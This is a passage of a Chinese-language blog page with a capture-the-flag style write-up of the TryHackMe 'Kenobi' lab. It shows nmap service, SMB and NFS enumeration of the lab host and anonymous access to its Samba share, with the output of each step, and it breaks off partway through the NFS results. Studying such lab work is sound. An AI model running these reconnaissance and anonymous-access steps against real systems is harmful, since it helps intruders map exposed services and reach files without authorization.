@@ -1,0 +1,401 @@
+<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM - Offensive Pentesting - Section - Kenobi | symv1a</title><meta name="author" content="symv1a,symv1a@163.com"><meta name="copyright" content="symv1a"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="THM - Offensive Pentesting - Section - Kenobi此房间将涵盖访问 Samba 共享、纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。有关利用 Linux 计算机的演练。枚举 Samba 的共享，作易受攻击的 proftpd 版本，并通过路径变量作提升您的权限。 ‍ nmap 扫描 1234567">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM - Offensive Pentesting - Section - Kenobi">
+<meta property="og:url" content="https://symya.github.io/post/kenobi-z1xnvhq.html">
+<meta property="og:site_name" content="symv1a">
+<meta property="og:description" content="THM - Offensive Pentesting - Section - Kenobi此房间将涵盖访问 Samba 共享、纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。有关利用 Linux 计算机的演练。枚举 Samba 的共享，作易受攻击的 proftpd 版本，并通过路径变量作提升您的权限。 ‍ nmap 扫描 1234567">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png">
+<meta property="article:published_time" content="2024-07-07T21:44:11.000Z">
+<meta property="article:modified_time" content="2024-07-07T21:39:28.000Z">
+<meta property="article:author" content="symv1a">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="打靶">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="TryHackMe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "THM - Offensive Pentesting - Section - Kenobi",
+  "url": "https://symya.github.io/post/kenobi-z1xnvhq.html",
+  "image": "https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png",
+  "datePublished": "2024-07-07T21:44:11.000Z",
+  "dateModified": "2024-07-07T21:39:28.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "symv1a",
+      "url": "https://symya.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png"><link rel="canonical" href="https://symya.github.io/post/kenobi-z1xnvhq.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THM - Offensive Pentesting - Section - Kenobi',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" alt="Logo"><span class="site-name">symv1a</span></a><a class="nav-page-title" href="/"><span class="site-name">THM - Offensive Pentesting - Section - Kenobi</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">THM - Offensive Pentesting - Section - Kenobi</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-07T21:44:11.000Z" title="Created 2024-07-07 21:44:11">2024-07-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-07T21:39:28.000Z" title="Updated 2024-07-07 21:39:28">2024-07-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/THM/">THM</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>13mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:150,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2024-07-07 21:39:28&quot;}" hidden></div><h1 id="THM-Offensive-Pentesting-Section-Kenobi"><a href="#THM-Offensive-Pentesting-Section-Kenobi" class="headerlink" title="THM - Offensive Pentesting - Section - Kenobi"></a>THM - Offensive Pentesting - Section - Kenobi</h1><p>此房间将涵盖访问 Samba 共享、纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。有关利用 Linux 计算机的演练。枚举 Samba 的共享，作易受攻击的 proftpd 版本，并通过路径变量作提升您的权限。</p>
+<p>‍</p>
+<p>nmap 扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -sV -sC -p- --min-rate 10000 10.10.166.21</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-07 09:40 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.166.21</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 65524 closed ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         ProFTPD 1.3.5</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)</span><br><span class="line">|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)</span><br><span class="line">|_  256 5a:06:ed:eb:b6:56:7e:4c:01:<span class="built_in">dd</span>:ea:bc:ba:fa:33:79 (ED25519)</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/admin.html</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">111/tcp   open  rpcbind     2-4 (RPC #100000)</span></span><br><span class="line"><span class="string">| rpcinfo: </span></span><br><span class="line"><span class="string">|   program version    port/proto  service</span></span><br><span class="line"><span class="string">|   100000  2,3,4        111/tcp   rpcbind</span></span><br><span class="line"><span class="string">|   100000  2,3,4        111/udp   rpcbind</span></span><br><span class="line"><span class="string">|   100000  3,4          111/tcp6  rpcbind</span></span><br><span class="line"><span class="string">|   100000  3,4          111/udp6  rpcbind</span></span><br><span class="line"><span class="string">|   100003  2,3,4       2049/tcp   nfs</span></span><br><span class="line"><span class="string">|   100003  2,3,4       2049/tcp6  nfs</span></span><br><span class="line"><span class="string">|   100003  2,3,4       2049/udp   nfs</span></span><br><span class="line"><span class="string">|   100003  2,3,4       2049/udp6  nfs</span></span><br><span class="line"><span class="string">|   100005  1,2,3      39169/udp6  mountd</span></span><br><span class="line"><span class="string">|   100005  1,2,3      46785/udp   mountd</span></span><br><span class="line"><span class="string">|   100005  1,2,3      47837/tcp   mountd</span></span><br><span class="line"><span class="string">|   100005  1,2,3      54969/tcp6  mountd</span></span><br><span class="line"><span class="string">|   100021  1,3,4      33079/tcp6  nlockmgr</span></span><br><span class="line"><span class="string">|   100021  1,3,4      36967/udp   nlockmgr</span></span><br><span class="line"><span class="string">|   100021  1,3,4      40627/udp6  nlockmgr</span></span><br><span class="line"><span class="string">|   100021  1,3,4      46753/tcp   nlockmgr</span></span><br><span class="line"><span class="string">|   100227  2,3         2049/tcp   nfs_acl</span></span><br><span class="line"><span class="string">|   100227  2,3         2049/tcp6  nfs_acl</span></span><br><span class="line"><span class="string">|   100227  2,3         2049/udp   nfs_acl</span></span><br><span class="line"><span class="string">|_  100227  2,3         2049/udp6  nfs_acl</span></span><br><span class="line"><span class="string">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span></span><br><span class="line"><span class="string">445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span></span><br><span class="line"><span class="string">2049/tcp  open  nfs_acl     2-3 (RPC #100227)</span></span><br><span class="line"><span class="string">33079/tcp open  mountd      1-3 (RPC #100005)</span></span><br><span class="line"><span class="string">41543/tcp open  mountd      1-3 (RPC #100005)</span></span><br><span class="line"><span class="string">46753/tcp open  nlockmgr    1-4 (RPC #100021)</span></span><br><span class="line"><span class="string">47837/tcp open  mountd      1-3 (RPC #100005)</span></span><br><span class="line"><span class="string">Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_clock-skew: mean: 1h40m34s, deviation: 2h53m12s, median: 33s</span></span><br><span class="line"><span class="string">|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span></span><br><span class="line"><span class="string">| smb-os-discovery: </span></span><br><span class="line"><span class="string">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span></span><br><span class="line"><span class="string">|   Computer name: kenobi</span></span><br><span class="line"><span class="string">|   NetBIOS computer name: KENOBI\x00</span></span><br><span class="line"><span class="string">|   Domain name: \x00</span></span><br><span class="line"><span class="string">|   FQDN: kenobi</span></span><br><span class="line"><span class="string">|_  System time: 2025-04-07T08:42:05-05:00</span></span><br><span class="line"><span class="string">| smb-security-mode: </span></span><br><span class="line"><span class="string">|   account_used: guest</span></span><br><span class="line"><span class="string">|   authentication_level: user</span></span><br><span class="line"><span class="string">|   challenge_response: supported</span></span><br><span class="line"><span class="string">|_  message_signing: disabled (dangerous, but default)</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   2.02: </span></span><br><span class="line"><span class="string">|_    Message signing enabled but not required</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2025-04-07T13:42:05</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 39.38 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>扫到了11个端口，其中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">33079/tcp open  mountd      1-3 (RPC #100005)</span><br><span class="line">41543/tcp open  mountd      1-3 (RPC #100005)</span><br><span class="line">46753/tcp open  nlockmgr    1-4 (RPC #100021)</span><br><span class="line">47837/tcp open  mountd      1-3 (RPC #100005)</span><br></pre></td></tr></table></figure>
+
+<p>都是111端口上rpcbind服务的映射。thm提示开放端口为个位数，所以正确答案应为：7个</p>
+<p>‍</p>
+<h2 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h2><p>amba 是适用于 Linux 和 Unix 的标准 Windows 互作性程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常见共享资源。它通常被称为网络文件系统。</p>
+<p>Samba 基于服务器消息块 （SMB） 的通用客户端&#x2F;服务器协议。SMB 专为 Windows 开发，如果没有 Samba，其他计算机平台将与 Windows 计算机隔离，即使它们属于同一网络。</p>
+<p>SMB 有两个端口，即 445 和 139</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.166.21</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-07 10:07 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.166.21</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-enum-shares: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   \\10.10.166.21\IPC$: </span><br><span class="line">|     Type: STYPE_IPC_HIDDEN</span><br><span class="line">|     Comment: IPC Service (kenobi server (Samba, Ubuntu))</span><br><span class="line">|     Users: 1</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.166.21\anonymous: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: </span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\home\kenobi\share</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.166.21\<span class="built_in">print</span>$: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Printer Drivers</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\var\lib\samba\printers</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|_    Current user access: &lt;none&gt;</span><br><span class="line">|_smb-enum-users: ERROR: Script execution failed (use -d to debug)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 35.20 seconds</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>\\10.10.166.21\IPC$</code></li>
+</ol>
+<ul>
+<li><strong>类型</strong>：隐藏的 IPC 服务共享</li>
+<li><strong>路径</strong>：<code>C:\tmp</code></li>
+<li><strong>匿名访问</strong>：READ&#x2F;WRITE ✅</li>
+<li><strong>当前用户访问</strong>：READ&#x2F;WRITE ✅</li>
+</ul>
+<blockquote>
+<p>说明：你可以匿名连接 IPC$ 管道，通常用来建立会话或进行信息传递。</p>
+</blockquote>
+<ol start="2">
+<li><code>\\10.10.166.21\anonymous</code></li>
+</ol>
+<ul>
+<li><strong>类型</strong>：普通磁盘共享</li>
+<li><strong>路径</strong>：<code>C:\home\kenobi\share</code></li>
+<li><strong>匿名访问</strong>：READ&#x2F;WRITE ✅</li>
+<li><strong>当前用户访问</strong>：READ&#x2F;WRITE ✅</li>
+</ul>
+<blockquote>
+<p>🔥重点：<strong>你可以匿名访问目标用户 kenobi 的共享目录，具备读写权限，可能藏着重要线索或凭证。</strong></p>
+</blockquote>
+<ol start="3">
+<li><code>\\10.10.166.21\print$</code></li>
+</ol>
+<ul>
+<li><strong>类型</strong>：打印机驱动共享</li>
+<li><strong>路径</strong>：<code>C:\var\lib\samba\printers</code></li>
+<li><strong>匿名访问</strong>：无 ❌</li>
+<li><strong>当前用户访问</strong>：无 ❌</li>
+</ul>
+<blockquote>
+<p>常见的打印共享，没权限可以跳过。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient //10.10.166.21/anonymous</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250407221846-nb7bime.png" alt="image"></p>
+<p>直接smbclient进入后，get文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250407222532-uwslehh.png" alt="image"></p>
+<p>或者以递归方式下载 SMB 共享。将用户名和密码作为 nothing 提交。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbget smb://machine-ip/anonymous</span><br></pre></td></tr></table></figure>
+
+<p>找到ftp服务所在端口：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250407222758-q6d5xg8.png" alt="image"></p>
+<p>‍</p>
+<h2 id="rpcbind"><a href="#rpcbind" class="headerlink" title="rpcbind"></a>rpcbind</h2><p>端口 111 运行服务 rpcbind。这只是一个将远程过程调用 （RPC） 程序编号转换为通用地址的服务器。当 RPC 服务启动时，它会告诉 rpcbind 它正在侦听的地址以及它准备提供的 RPC 程序编号。</p>
+<blockquote>
+<p>什么是 RPCBld ?</p>
+<p>是一种服务，它提供远程过程调用 （RPC） 程序编号和可以访问这些服务的网络地址之间的映射。RPC 是一种用于网络上不同进程之间通信的协议。它允许程序使过程（子例程）在另一个地址空间（通常在另一台机器上）上执行。</p>
+<p>该服务也称为 RPC 绑定服务或端口映射器，有助于将端口动态分配给 RPC 服务。当 RPC 服务器启动时，它会注册自身以动态获取端口号。然后，其他程序（称为 RPC 客户端）可以查询以查找与特定 RPC 程序编号关联的端口号。</p>
+<p>这种端口的动态分配简化了基于 RPC 的服务的管理，使它们更加灵活，并且易于移动或更换，而不会影响客户端。 使用众所周知的端口号 111。<code>rpcbind</code></p>
+<p>请务必注意，虽然它可用于管理基于 RPC 的服务，但它也存在潜在的安全风险。未经授权访问服务可能会导致各种安全漏洞。因此，在某些注重安全的环境中，管理员可能会选择限制或保护对服务的访问。</p>
+</blockquote>
+<p>在这个例子中，端口 111 是对网络文件系统的访问。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.166.21</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.166.21</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-07 10:29 EDT</span><br><span class="line">Nmap scan report for 10.10.166.21</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line">| nfs-ls: Volume /var</span><br><span class="line">|   access: Read Lookup NoModify NoExtend NoDelete NoExecute</span><br><span class="line">| PERMISSION  UID  GID  SIZE  TIME                 FILENAME</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache</span><br><span class="line">| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash</span><br><span class="line">| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local</span><br><span class="line">| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock</span><br><span class="line">| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap</span><br><span class="line">| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www</span><br><span class="line">|_</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  /var *</span><br><span class="line">| nfs-statfs: </span><br><span class="line">|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink</span><br><span class="line">|_  /var        9204224.0  1836532.0 